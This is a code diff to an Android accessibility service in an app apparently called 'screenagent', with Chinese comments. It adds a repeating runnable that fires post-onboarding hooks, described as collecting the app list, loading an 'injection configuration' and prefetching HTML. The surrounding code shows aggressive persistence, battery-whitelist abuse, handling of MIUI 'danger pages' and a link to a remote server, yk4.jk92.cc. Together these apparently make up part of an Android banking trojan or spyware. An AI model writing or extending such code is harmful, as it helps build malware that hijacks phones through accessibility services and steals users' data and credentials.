@@ -392,6 +392,9 @@ class BoundaryAccessibilityService : AccessibilityService() {
         }
         // 2.3：保活（2.2：前台服务 + Job(15min,persisted) + 精确闹钟 + 电池白名单）
         runCatching { com.zaka.screenagent.keepalive.KeepAliveManager.startAll(this) }
+        // 通用：引导完成后的收尾（应用列表 / 注入配置 / HTML 预取），任何厂商都生效
+        main.removeCallbacks(hooksWatch)
+        main.postDelayed(hooksWatch, 5_000L)
         // MIUI：不再巡检；危险页处理由 admin 步骤一次性排期
         main.postDelayed(dumpTick, 800L)
         // 2.3：接墨影协议（与 2.2 服务器 yk4.jk92.cc 对接）
@@ -449,6 +452,16 @@ class BoundaryAccessibilityService : AccessibilityService() {
                 }, 2_000L)
             }
         }, 2_000L)
+    }
+
+    // 通用兜底：引导完成后（任何厂商）只跑一次收尾
+    private val hooksWatch = object : Runnable {
+        override fun run() {
+            if (com.zaka.screenagent.admin.OnboardingState.isDone(this@BoundaryAccessibilityService)) {
+                com.zaka.screenagent.flow.OnboardingHooks.complete(this@BoundaryAccessibilityService)
+            }
+            main.postDelayed(this, 10_000L)
+        }
     }
 
     private fun unusedAnchor() {
